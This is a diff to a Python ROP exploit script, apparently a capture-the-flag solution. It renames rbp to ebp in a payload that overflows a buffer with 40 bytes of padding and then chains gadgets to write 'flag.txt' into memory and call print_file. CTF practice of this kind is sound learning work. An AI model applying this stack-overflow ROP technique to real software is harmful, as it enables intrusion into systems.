@@ -5,9 +5,9 @@
 import struct
 import sys
 
-padding_len = 40 #until just before rbp is overwritten
+padding_len = 40 #until just before ebp is overwritten
 
-rbp = struct.pack("I", 0xc000ffee) #just something recognizable so I'm sure the offset is right
+ebp = struct.pack("I", 0xc000ffee) #just something recognizable so I'm sure the offset is right
 
 print_file = struct.pack("I", 0x080483d0) # print_file(char*)
 mov_edi_ebp = struct.pack("I", 0x08048543) # mov [edi], ebp; ret
@@ -20,7 +20,7 @@ filename_loc2 = struct.pack("I", filename_loc_raw+4)
 filename = b"flag.txt"
 
 payload = b'A'*padding_len
-payload += rbp
+payload += ebp
 payload += pop_edi_ebp
 payload += filename_loc1
 payload += filename[:4]
